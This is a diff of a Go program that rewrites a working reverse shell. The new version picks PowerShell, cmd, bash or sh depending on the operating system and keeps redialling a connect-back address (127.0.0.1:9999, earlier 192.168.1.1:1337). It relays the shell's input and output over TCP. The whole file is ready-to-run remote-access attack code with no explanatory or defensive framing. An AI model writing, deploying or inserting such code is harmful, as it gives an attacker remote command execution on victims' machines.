@@ -1,26 +1,82 @@
 package main
 
 import (
+	"fmt"
 	"net"
+	"os"
 	"os/exec"
+	"runtime"
+	"time"
 )
 
-var Destination = "192.168.1.1:1337"
-var Shell = "/bin/sh"
-const BufferSize = 128
+var Target = "127.0.0.1:9999"
+var BufferSize = 128
 
-func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
-	var cmd *exec.Cmd
-	cmd = exec.Command(command)
-	stdin, _ := cmd.StdinPipe()
-	stdout, _ := cmd.StdoutPipe()
-	stderr, _ := cmd.StderrPipe()
+func findShell() string {
+	shells := []string{}
+	if runtime.GOOS == "windows" {
+		shells = []string{
+			"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+			"C:\\Windows\\System32\\cmd.exe",
+		}
+	} else {
+		shells = []string{
+			"/usr/local/bin/bash",
+			"/usr/bin/bash",
+			"/bin/bash",
+			"/bin/sh",
+		}
+	}
+	for _, path := range shells {
+		_, err := os.Stat(path)
+		if err == nil {
+			return path
+		}
+	}
+	return ""
+}
+
+func connectBack(address string) net.Conn {
+	for {
+		connection, err := net.Dial("tcp", address)
+		if err == nil {
+			return connection
+		}
+		fmt.Printf("connect back: %v\n", err)
+		time.Sleep(3 * time.Second)
+	}
+}
+
+func executeShell(shell string, input <-chan []byte, output chan<- []byte, errors chan<- error) {
+	command := exec.Command(shell)
+
+	stdin, err := command.StdinPipe()
+	if err != nil {
+		errors <- err
+		return
+	}
+
+	stdout, err := command.StdoutPipe()
+	if err != nil {
+		errors <- err
+		return
+	}
+
+	stderr, err := command.StderrPipe()
+	if err != nil {
+		errors <- err
+		return
+	}
 
 	go func() {
 		for {
 			select {
-			case incoming := <-recv:
-				stdin.Write(incoming)
+			case data := <-input:
+				_, err := stdin.Write(data)
+				if err != nil {
+					errors <- err
+					return
+				}
 			}
 		}
 	}()
@@ -28,39 +84,76 @@ func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
 	go func() {
 		for {
 			buf := make([]byte, BufferSize)
-			stderr.Read(buf)
-			send <- buf
+			_, err := stdout.Read(buf)
+			if err != nil {
+				errors <- err
+				return
+			}
+			output <- buf
 		}
 	}()
 
-	cmd.Start()
+	go func() {
+		for {
+			buf := make([]byte, BufferSize)
+			_, err := stderr.Read(buf)
+			if err != nil {
+				errors <- err
+				return
+			}
+			output <- buf
+		}
+	}()
+
+	command.Run()
+}
+
+func receiveInput(connection net.Conn, input chan<- []byte, errors chan<- error) {
 	for {
-		buf := make([]byte, BufferSize)
-		stdout.Read(buf)
-		send <- buf
+		data := make([]byte, BufferSize)
+		connection.SetReadDeadline(time.Now().Add(1 * time.Second))
+		_, err := connection.Read(data)
+		if err != nil && !os.IsTimeout(err) {
+			errors <- err
+			return
+		}
+		input <- data
+	}
+}
+
+func sendOutput(connection net.Conn, output <-chan []byte, errors chan<- error) {
+	for {
+		select {
+		case data := <-output:
+			connection.SetWriteDeadline(time.Now().Add(1 * time.Second))
+			_, err := connection.Write(data)
+			if err != nil && !os.IsTimeout(err) {
+				errors <- err
+				return
+			}
+		}
 	}
 }
 
 func main() {
-	conn, _ := net.Dial("tcp", Destination)
-	send := make(chan []byte)
-	recv := make(chan []byte)
-
-	go reverseShell(Shell, send, recv)
-
-	go func() {
-		for {
-			data := make([]byte, BufferSize)
-			conn.Read(data)
-			recv <- data
-		}
-	}()
-
+	shell := findShell()
+	if shell == "" {
+		fmt.Println("no shell executable found")
+		os.Exit(1)
+	}
 	for {
+		input := make(chan []byte)
+		output := make(chan []byte)
+		errors := make(chan error)
+		connection := connectBack(Target)
+		defer connection.Close()
+		go executeShell(shell, input, output, errors)
+		go receiveInput(connection, input, errors)
+		go sendOutput(connection, output, errors)
 		select {
-		case outgoing := <-send:
-			conn.Write(outgoing)
+		case err := <-errors:
+			fmt.Println(err)
+			break
 		}
 	}
 }
-
